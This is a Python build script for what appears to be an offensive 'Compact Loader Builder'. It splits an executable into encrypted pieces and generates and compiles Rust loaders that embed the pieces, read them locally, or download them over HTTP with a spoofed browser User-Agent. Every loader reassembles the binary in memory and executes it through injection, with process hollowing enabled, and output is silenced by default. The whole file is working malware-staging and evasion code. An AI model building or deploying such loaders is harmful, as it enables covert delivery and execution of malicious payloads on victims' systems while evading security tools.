import argparse
import os
import glob
import sys
import re

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(SCRIPT_DIR)

parser = argparse.ArgumentParser(
    description="Compact Loader Builder",
    epilog="Available modes: embedded (default), http, local. Use 'create_loader.py <mode> --help' for mode-specific options."
)
subparsers = parser.add_subparsers(dest="mode", help="Loader type to build", metavar="MODE", required=False)

embedded_parser = subparsers.add_parser("embedded", help="Build loader with parts embedded in binary (default)")
embedded_parser.add_argument("executable", help="Input file path")
embedded_parser.add_argument("--password", default="ChangeMe", help="Password for encryption")
embedded_parser.add_argument("--pieces", "-p", type=int, default=4, help="Number of pieces to split")
embedded_parser.add_argument("--name", "-n", default="compact", help="Name prefix for parts")
embedded_parser.add_argument("--output-dir", "-o", default="tmp", help="Output directory for parts")

http_parser = subparsers.add_parser("http", help="Build loader that downloads parts from HTTP server")
http_parser.add_argument("executable", help="Input file path")
http_parser.add_argument("--urls", required=True, help="Base URL(s) for parts (comma-separated or use {n} placeholder)")
http_parser.add_argument("--password", default="ChangeMe", help="Password for encryption")
http_parser.add_argument("--pieces", "-p", type=int, default=4, help="Number of pieces to split")
http_parser.add_argument("--name", "-n", default="compact", help="Name prefix for parts")
http_parser.add_argument("--output-dir", "-o", default="tmp", help="Output directory for parts")
http_parser.add_argument("--timeout", type=int, default=30, help="HTTP timeout in seconds")
http_parser.add_argument("--user-agent", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64)", help="User-Agent string")

local_parser = subparsers.add_parser("local", help="Build loader that reads parts from local files")
local_parser.add_argument("executable", help="Input file path")
local_parser.add_argument("--password", default="ChangeMe", help="Password for encryption")
local_parser.add_argument("--pieces", "-p", type=int, default=4, help="Number of pieces to split")
local_parser.add_argument("--name", "-n", default="compact", help="Name prefix for parts")
local_parser.add_argument("--output-dir", "-o", default="tmp", help="Output directory for parts")

if len(sys.argv) > 1 and sys.argv[1] in ["--help", "-h"]:
    parser.print_help()
    sys.exit(0)

if len(sys.argv) > 1:
    mode = sys.argv[1].lower()
    typo_corrections = {
        "embededd": "embedded",
        "embeded": "embedded",
        "embed": "embedded",
    }
    if mode in typo_corrections:
        sys.argv[1] = typo_corrections[mode]
        print(f"[*] Corrected mode typo: '{mode}' -> 'embedded'")
    elif mode not in ["embedded", "http", "local"]:
        sys.argv.insert(1, "embedded")

try:
    args = parser.parse_args()
except SystemExit as e:
    if e.code != 0:
        parser.print_help()
    sys.exit(e.code if e.code is not None else 1)

if args.mode is None:
    sys.argv.insert(1, "embedded")
    try:
        args = parser.parse_args()
    except SystemExit as e:
        if e.code != 0:
            parser.print_help()
        sys.exit(e.code if e.code is not None else 1)


def main():
    try:
        if args.mode == "http":
            return build_http_loader()
        elif args.mode == "local":
            return build_local_loader()
        else:
            return build_embedded_loader()
    finally:
        cleanup_workspace()


def build_embedded_loader():
    os.chdir(PROJECT_ROOT)
    
    print(f"[*] Splitting {args.executable} into {args.pieces} parts...")
    split_cmd = (
        f"cargo run -p splitter -- {args.executable} "
        f"-p {args.pieces} --password {args.password} -v "
        f"-o {args.output_dir} --name {args.name}"
    )
    result = os.system(split_cmd)
    if result != 0:
        print("[-] Error splitting binary")
        return 1

    print(f"[*] Reading parts from {args.output_dir}...")
    part_files = sorted(glob.glob(os.path.join(args.output_dir, f"{args.name}.part*")))
    if not part_files:
        print(f"[-] No parts found in {args.output_dir}")
        return 1

    print(f"[+] Found {len(part_files)} parts")

    print("[*] Generating embedded loader...")
    rust_code = generate_embedded_loader(part_files, args.password)
    
    loader_dir = "crates/embedded_loader"
    os.makedirs(loader_dir, exist_ok=True)
    os.makedirs(f"{loader_dir}/src", exist_ok=True)
    
    with open(f"{loader_dir}/src/main.rs", "w", encoding="utf-8") as f:
        f.write(rust_code)
    
    cargo_toml = f"""[package]
name = "embedded_loader"
version = "0.1.0"
edition = "2021"
license = "GPL-3.0"
authors = ["M3str3 <namestre3@protonmail.com>"]

[dependencies]
mounterlib = {{ path = "../mounterlib", features = ["download-local", "execution-local-pe", "execution-process-hollowing"] }}
mainlib = {{ path = "../mainlib" }}
anyhow = "1.0"
"""
    with open(f"{loader_dir}/Cargo.toml", "w", encoding="utf-8") as f:
        f.write(cargo_toml)
    
    update_workspace(loader_dir)
    
    print("[*] Compiling embedded loader...")
    compile_cmd = f"cargo build --release -p embedded_loader"
    result = os.system(compile_cmd)
    if result != 0:
        print("[-] Error compiling embedded loader")
        return 1
    
    print(f"[+] Embedded loader compiled: target/release/embedded_loader.exe")
    return 0


def build_http_loader():
    os.chdir(PROJECT_ROOT)
    
    print(f"[*] Splitting {args.executable} into {args.pieces} parts...")
    split_cmd = (
        f"cargo run -p splitter -- {args.executable} "
        f"-p {args.pieces} --password {args.password} -v "
        f"-o {args.output_dir} --name {args.name}"
    )
    result = os.system(split_cmd)
    if result != 0:
        print("[-] Error splitting binary")
        return 1

    print(f"[*] Generating HTTP loader...")
    urls = generate_urls(args.urls, args.pieces, args.name)
    
    rust_code = generate_http_loader(urls, args.password, args.timeout, args.user_agent)
    
    loader_dir = "crates/http_loader"
    os.makedirs(loader_dir, exist_ok=True)
    os.makedirs(f"{loader_dir}/src", exist_ok=True)
    
    with open(f"{loader_dir}/src/main.rs", "w", encoding="utf-8") as f:
        f.write(rust_code)
    
    cargo_toml = f"""[package]
name = "http_loader"
version = "0.1.0"
edition = "2021"
license = "GPL-3.0"
authors = ["M3str3 <namestre3@protonmail.com>"]

[dependencies]
mounterlib = {{ path = "../mounterlib", features = ["download-http", "execution-local-pe", "execution-process-hollowing"] }}
anyhow = "1.0"
"""
    with open(f"{loader_dir}/Cargo.toml", "w", encoding="utf-8") as f:
        f.write(cargo_toml)
    
    update_workspace(loader_dir)
    
    print("[*] Compiling HTTP loader...")
    compile_cmd = f"cargo build --release -p http_loader"
    result = os.system(compile_cmd)
    if result != 0:
        print("[-] Error compiling HTTP loader")
        return 1
    
    print(f"[+] HTTP loader compiled: target/release/http_loader.exe")
    print(f"[*] Upload parts to server and ensure URLs are accessible:")
    for url in urls:
        print(f"    - {url}")
    return 0


def build_local_loader():
    os.chdir(PROJECT_ROOT)
    
    print(f"[*] Splitting {args.executable} into {args.pieces} parts...")
    split_cmd = (
        f"cargo run -p splitter -- {args.executable} "
        f"-p {args.pieces} --password {args.password} -v "
        f"-o {args.output_dir} --name {args.name}"
    )
    result = os.system(split_cmd)
    if result != 0:
        print("[-] Error splitting binary")
        return 1

    print(f"[*] Reading parts from {args.output_dir}...")
    part_files = sorted(glob.glob(os.path.join(args.output_dir, f"{args.name}.part*")))
    if not part_files:
        print(f"[-] No parts found in {args.output_dir}")
        return 1

    print(f"[+] Found {len(part_files)} parts")

    print("[*] Generating local loader...")
    rust_code = generate_local_loader(part_files, args.password)
    
    loader_dir = "crates/local_loader"
    os.makedirs(loader_dir, exist_ok=True)
    os.makedirs(f"{loader_dir}/src", exist_ok=True)
    
    with open(f"{loader_dir}/src/main.rs", "w", encoding="utf-8") as f:
        f.write(rust_code)
    
    cargo_toml = f"""[package]
name = "local_loader"
version = "0.1.0"
edition = "2021"
license = "GPL-3.0"
authors = ["M3str3 <namestre3@protonmail.com>"]

[dependencies]
mounterlib = {{ path = "../mounterlib", features = ["download-local", "execution-local-pe", "execution-process-hollowing"] }}
anyhow = "1.0"
"""
    with open(f"{loader_dir}/Cargo.toml", "w", encoding="utf-8") as f:
        f.write(cargo_toml)
    
    update_workspace(loader_dir)
    
    print("[*] Compiling local loader...")
    compile_cmd = f"cargo build --release -p local_loader"
    result = os.system(compile_cmd)
    if result != 0:
        print("[-] Error compiling local loader")
        return 1
    
    print(f"[+] Local loader compiled: target/release/local_loader.exe")
    print(f"[*] Place parts in same directory as loader:")
    for part_file in part_files:
        print(f"    - {os.path.basename(part_file)}")
    return 0


def update_workspace(loader_dir):
    cargo_toml_path = os.path.join(PROJECT_ROOT, "Cargo.toml")
    
    with open(cargo_toml_path, "r", encoding="utf-8") as f:
        content = f.read()
    
    crate_name = os.path.basename(loader_dir)
    crate_path = f"crates/{crate_name}"
    
    if f'"{crate_path}"' in content:
        return
    
    lines = content.split('\n')
    for i, line in enumerate(lines):
        if line.strip().startswith('members = ['):
            line_stripped = line.rstrip()
            if line_stripped.endswith(']'):
                line_stripped = line_stripped[:-1]
                if not line_stripped.endswith(','):
                    line_stripped += ','
                line_stripped += f' "{crate_path}"]'
            else:
                line_stripped += f', "{crate_path}"]'
            lines[i] = line_stripped + '\n'
            break
    
    with open(cargo_toml_path, "w", encoding="utf-8") as f:
        f.write('\n'.join(lines))


def cleanup_workspace():
    cargo_toml_path = os.path.join(PROJECT_ROOT, "Cargo.toml")
    
    try:
        with open(cargo_toml_path, "r", encoding="utf-8") as f:
            content = f.read()
        
        generated_crates = ["embedded_loader", "http_loader", "local_loader"]
        
        lines = content.split('\n')
        modified = False
        
        for i, line in enumerate(lines):
            if line.strip().startswith('members = ['):
                original_line = line
                members_line = line
                
                for crate_name in generated_crates:
                    crate_path = f"crates/{crate_name}"
                    crate_dir = os.path.join(PROJECT_ROOT, crate_path)
                    
                    if not os.path.exists(crate_dir):
                        members_line = re.sub(rf',?\s*"{re.escape(crate_path)}"', '', members_line)
                        members_line = re.sub(rf',?\s*"{re.escape(crate_name)}"', '', members_line)
                
                members_line = re.sub(r',\s*,', ',', members_line)
                members_line = re.sub(r'\[\s*,', '[', members_line)
                members_line = re.sub(r',\s*\]', ']', members_line)
                
                if members_line != original_line:
                    lines[i] = members_line
                    modified = True
                break
        
        if modified:
            with open(cargo_toml_path, "w", encoding="utf-8") as f:
                f.write('\n'.join(lines))
    except Exception:
        pass


def generate_urls(urls_input, num_parts, name_prefix):
    urls = []
    if "," in urls_input:
        base_urls = [u.strip() for u in urls_input.split(",")]
        for i in range(num_parts):
            if i < len(base_urls):
                urls.append(base_urls[i])
            else:
                last_url = base_urls[-1]
                if "{n}" in last_url:
                    urls.append(last_url.replace("{n}", f"{i:03d}"))
                else:
                    urls.append(f"{last_url}/{name_prefix}.part{i:03d}")
    else:
        base_url = urls_input.strip()
        if "{n}" in base_url:
            for i in range(num_parts):
                urls.append(base_url.replace("{n}", f"{i:03d}"))
        else:
            if not base_url.endswith("/"):
                base_url += "/"
            for i in range(num_parts):
                urls.append(f"{base_url}{name_prefix}.part{i:03d}")
    return urls


def generate_http_loader(urls, password, timeout, user_agent):
    urls_array = ",\n        ".join(f'"{url}".to_string()' for url in urls)
    
    rust_code = f"""//! HTTP loader that downloads parts from server

use mounterlib::{{download::http::download_all_as_map, reconstruct::rebuild_from_parts, execution::local_pe::inject_and_execute}};
use anyhow::{{Context, Result}};

const URLS: &[&str] = &[
        {", ".join(f'"{url}"' for url in urls)}
];

const PASSWORD: &str = "{password}";
const TIMEOUT: u64 = {timeout};
const USER_AGENT: &str = "{user_agent}";
const VERBOSE: bool = false; // Change to true for enable verbose

fn main() {{
    if let Err(e) = run() {{
        eprintln!("[-] Error: {{}}", e);
        std::process::exit(1);
    }}
}}

fn run() -> Result<()> {{
    if VERBOSE {{
        println!("[*] Downloading {{}} parts from server...", URLS.len());
    }}

    let urls: Vec<String> = URLS.iter().map(|s| s.to_string()).collect();
    let parts = download_all_as_map(&urls, TIMEOUT, USER_AGENT, VERBOSE)
        .context("Failed to download parts")?;

    if VERBOSE {{
        println!("[+] Downloaded {{}} parts successfully", parts.len());
        println!("[*] Reconstructing binary in memory...");
    }}

    let binary = rebuild_from_parts(
        parts,
        Some(PASSWORD),
        true,  // Validate checksums
        VERBOSE,
    )
    .context("Failed to reconstruct binary")?;

    if VERBOSE {{
        println!(
            "[+] Binary reconstructed: {{}} bytes ({{:.2}} MB)",
            binary.len(),
            binary.len() as f64 / 1_048_576.0
        );
        println!("[*] Executing binary in memory...");
    }}

    inject_and_execute(&binary, &[], VERBOSE)
        .context("Failed to execute binary")?;

    Ok(())
}}
"""
    return rust_code


def generate_local_loader(part_files, password):
    filenames = [os.path.basename(f) for f in part_files]
    filenames_array = ",\n        ".join(f'"{f}"' for f in filenames)
    
    rust_code = f"""//! Local loader that reads parts from filesystem

use mounterlib::{{download::local::load_all_as_map, reconstruct::rebuild_from_parts, execution::local_pe::inject_and_execute}};
use std::path::PathBuf;
use anyhow::{{Context, Result}};

const PART_FILES: &[&str] = &[
        {filenames_array}
];

const PASSWORD: &str = "{password}";
const VERBOSE: bool = false; // Change to true for enable verbose

fn main() {{
    if let Err(e) = run() {{
        eprintln!("[-] Error: {{}}", e);
        std::process::exit(1);
    }}
}}

fn run() -> Result<()> {{
    let exe_path = std::env::current_exe()
        .context("Failed to get executable path")?;
    let exe_dir = exe_path.parent()
        .ok_or_else(|| anyhow::anyhow!("Failed to get executable directory"))?;

    if VERBOSE {{
        println!("[*] Loading {{}} parts from local files...", PART_FILES.len());
        println!("[*] Base directory: {{}}", exe_dir.display());
    }}

    let paths: Vec<PathBuf> = PART_FILES
        .iter()
        .map(|filename| exe_dir.join(filename))
        .collect();

    let parts = load_all_as_map(&paths, VERBOSE)
        .context("Failed to load parts from local files")?;

    if VERBOSE {{
        println!("[+] Loaded {{}} parts successfully", parts.len());
        println!("[*] Reconstructing binary in memory...");
    }}

    let binary = rebuild_from_parts(
        parts,
        Some(PASSWORD),
        true,  // Validate checksums
        VERBOSE,
    )
    .context("Failed to reconstruct binary")?;

    if VERBOSE {{
        println!(
            "[+] Binary reconstructed: {{}} bytes ({{:.2}} MB)",
            binary.len(),
            binary.len() as f64 / 1_048_576.0
        );
        println!("[*] Executing binary in memory...");
    }}

    inject_and_execute(&binary, &[], VERBOSE)
        .context("Failed to execute binary")?;

    Ok(())
}}
"""
    return rust_code


def generate_embedded_loader(part_files, password):
    arrays_defs = ""
    parts_refs_list = []
    for idx, part_file in enumerate(part_files):
        with open(part_file, "rb") as f:
            part_data = f.read()
            part_bytes = ", ".join(f"0x{b:02x}" for b in part_data)
            array_name = f"PART_{idx}_DATA"
            arrays_defs += f"const {array_name}: [u8; {len(part_data)}] = [{part_bytes}];\n    "
            parts_refs_list.append(f"&{array_name}")
    
    parts_refs = ",\n        ".join(parts_refs_list)
    
    rust_code = f"""//! Embedded loader with parts baked into the binary

use mounterlib::{{reconstruct::rebuild_from_parts, execution::local_pe::inject_and_execute}};
use mainlib::{{PartHeader, HEADER_SIZE_V1, HEADER_SIZE_V2, HEADER_VERSION_V1, HEADER_VERSION_V2}};
use std::collections::HashMap;
use anyhow::{{Context, Result}};

// Embedded parts as static arrays
    {arrays_defs}
const EMBEDDED_PARTS: &[&[u8]] = &[
        {parts_refs}
];

const PASSWORD: &str = "{password}";
const VERBOSE: bool = false; // Change to true for enable verbose

fn main() {{
    if let Err(e) = run() {{
        eprintln!("[-] Error: {{}}", e);
        std::process::exit(1);
    }}
}}

fn run() -> Result<()> {{
    if VERBOSE {{
        println!("[*] Loading {{}} embedded parts...", EMBEDDED_PARTS.len());
    }}

    let parts = load_embedded_parts()?;

    if VERBOSE {{
        println!("[+] Loaded {{}} parts successfully", parts.len());
        println!("[*] Reconstructing binary in memory...");
    }}

    let binary = rebuild_from_parts(
        parts,
        Some(PASSWORD),
        true,  // Validate checksums
        VERBOSE,
    )
    .context("Failed to reconstruct binary")?;

    if VERBOSE {{
        println!(
            "[+] Binary reconstructed: {{}} bytes ({{:.2}} MB)",
            binary.len(),
            binary.len() as f64 / 1_048_576.0
        );
        println!("[*] Executing binary in memory...");
    }}

    inject_and_execute(&binary, &[], VERBOSE)
        .context("Failed to execute binary")?;

    Ok(())
}}

fn load_embedded_parts() -> Result<HashMap<u32, (PartHeader, Vec<u8>)>> {{
    let mut parts = HashMap::new();

    for (idx, part_data) in EMBEDDED_PARTS.iter().enumerate() {{
        if VERBOSE {{
            println!("  [{{}}/{{}}] Loading embedded part...", idx + 1, EMBEDDED_PARTS.len());
        }}

        if part_data.len() < HEADER_SIZE_V1 {{
            anyhow::bail!(
                "Part {{}} is too small: {{}} bytes (minimum: {{}} bytes)",
                idx,
                part_data.len(),
                HEADER_SIZE_V1
            );
        }}

        let version = u16::from_le_bytes([part_data[4], part_data[5]]);
        let header_size = match version {{
            HEADER_VERSION_V1 => HEADER_SIZE_V1,
            HEADER_VERSION_V2 => HEADER_SIZE_V2,
            _ => anyhow::bail!("Unknown header version: {{}}", version),
        }};

        if part_data.len() < header_size {{
            anyhow::bail!(
                "Insufficient data for header: {{}} bytes (required: {{}} bytes)",
                part_data.len(),
                header_size
            );
        }}

        let header = PartHeader::from_bytes(&part_data[..header_size])
            .context("Failed to parse part header")?;

        let data = part_data[header_size..].to_vec();

        if data.len() != header.data_size as usize {{
            anyhow::bail!(
                "Data size mismatch: received {{}} bytes, header declares {{}} bytes",
                data.len(),
                header.data_size
            );
        }}

        if VERBOSE {{
            println!(
                "    ✓ Part {{}} of {{}} ({{}} bytes)",
                header.part_number + 1,
                header.total_parts,
                data.len()
            );
        }}

        if parts.contains_key(&header.part_number) {{
            anyhow::bail!(
                "Duplicate part detected: part number {{}}",
                header.part_number
            );
        }}

        parts.insert(header.part_number, (header, data));
    }}

    Ok(parts)
}}
"""
    return rust_code


if __name__ == "__main__":
    exit(main())

